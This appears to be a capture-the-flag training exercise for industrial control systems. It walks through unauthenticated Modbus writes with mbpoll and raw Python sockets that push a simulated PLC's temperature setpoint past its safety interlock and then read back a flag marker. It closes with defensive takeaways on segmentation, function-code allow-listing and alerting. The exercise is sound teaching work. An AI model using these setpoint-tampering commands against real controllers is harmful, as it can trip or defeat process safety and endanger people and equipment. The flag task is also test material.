# Exercise 1.2: Modbus Setpoint Tampering

## Before You Begin

- [ ] Launched the exercise and opened the REMnux/RangeBox desktop
- [ ] A terminal open
- [ ] The **PLC** address from the panel
- [ ] `python3`, `nmap`, `mbpoll` available

## Scenario

Trailline Industrial Controls runs the TIC-2400 controller you triaged in
exercise 1.1. This time it is wired to a simulated process line:

| Register | Meaning |
|----------|---------|
| 10 | Temperature setpoint (starts at 20) |
| 11 | Measured temperature |
| 12 | Alarm threshold (200) |
| 13 | Pump speed percentage |
| 40+ | Maintenance marker (empty until the interlock trips) |

Modbus has no authentication and no authorization. A master that can reach
TCP 502 can write a setpoint as easily as it can read one. Your job is to prove
that, confirm the write, and recover the marker the controller writes after the
safety interlock trips.

## Your Objectives

- Read the process registers
- Write the setpoint with function code 0x06
- Confirm the write by reading the register back
- Recover the marker the controller exposes after the trip

## Background: Writing Registers

| Code | Name | Use |
|------|------|-----|
| 0x05 | Write Single Coil | Set a bit, such as a pump command |
| 0x06 | Write Single Register | Set a 16-bit value, such as a setpoint |
| 0x0F | Write Multiple Coils | Set up to 1968 bits in one request |
| 0x10 | Write Multiple Registers | Set a contiguous block of registers |

A write request is the same MBAP header as a read, followed by the function
code, the register address, and the value. The response echoes the request; it
does not prove the process accepted the value. Read the register back.

Safety interlocks in this exercise: the controller trips when the setpoint is
250 or higher. The trip stops the pump, raises the alarm, and reports a fault
temperature.

## Walkthrough

### Step 1: Read the Process Registers

```bash
mbpoll -m tcp -p 502 -t 4 -r 10 -c 4 <plc_ip>
```

Register 10 should read 20, register 12 should read 200. Watch register 11
change as the simulation settles toward the setpoint.

### Step 2: Write the Setpoint

```bash
mbpoll -m tcp -p 502 -t 4 -r 10 <plc_ip> 250
```

The value follows the register address. Without a value, `mbpoll` reads.

### Step 3: Confirm the Write

```bash
mbpoll -m tcp -p 502 -t 4 -r 10 -c 2 <plc_ip>
```

Register 10 should read 250. Register 11 should soon read 999 (fault) because
the interlock has tripped.

### Step 4: Recover the Marker

Wait a few seconds for the controller to write the marker, then read the
holding registers starting at 40:

```bash
python3 - <<'PY'
import socket, struct
ip = "<plc_ip>"
s = socket.create_connection((ip, 502), 5)
s.sendall(struct.pack(">HHHBBHH", 1, 0, 6, 1, 3, 40, 40))
r = s.recv(256)
bc = r[8]
vals = struct.unpack(">%dH" % (bc // 2), r[9:9 + bc])
out = "".join(chr(v) for v in vals if 32 <= v < 127)
print(out.split(chr(0))[0])
PY
```

Submit the decoded marker as the flag.

### Step 5: Restore the Process (Optional)

Write the setpoint back to a safe value:

```bash
mbpoll -m tcp -p 502 -t 4 -r 10 <plc_ip> 20
```

The interlock stays tripped until the controller restarts. On a real line,
recovery needs a physical or supervisory reset, not another Modbus write.

## Analysis Questions

**1. What is the difference between a successful write response and a changed process?**

**2. Which function codes can change controller state, and how would you detect them at a network boundary?**

**3. Why is "read-only" Modbus filtering weaker than network segmentation?**

**4. What setpoint limits would you enforce in a filtering gateway, and where would you log violations?**

## Defensive Takeaways

- Modbus writes are unauthenticated. A response proves the frame arrived, not that the action was safe.
- A filtering gateway should allow-list function codes and register ranges, not just hosts.
- Alert on setpoint writes outside the operating envelope and on writes from masters that normally only read.
- Segment the control network so an IT workstation cannot reach TCP 502 directly.
- Define a documented recovery procedure: an interlock trip is not cleared by writing the old value back.

## If You Get Stuck

- **Write returns but the value does not change:** confirm the register address and that you used `-t 4` (holding registers) rather than coils.
- **No marker:** the trip needs a few seconds; read registers 40 to 79 after the fault appears in register 11.
- **Connection refused:** confirm the PLC IP and that port 502 is open.
- **mbpoll not found:** use the raw Python socket method shown above.
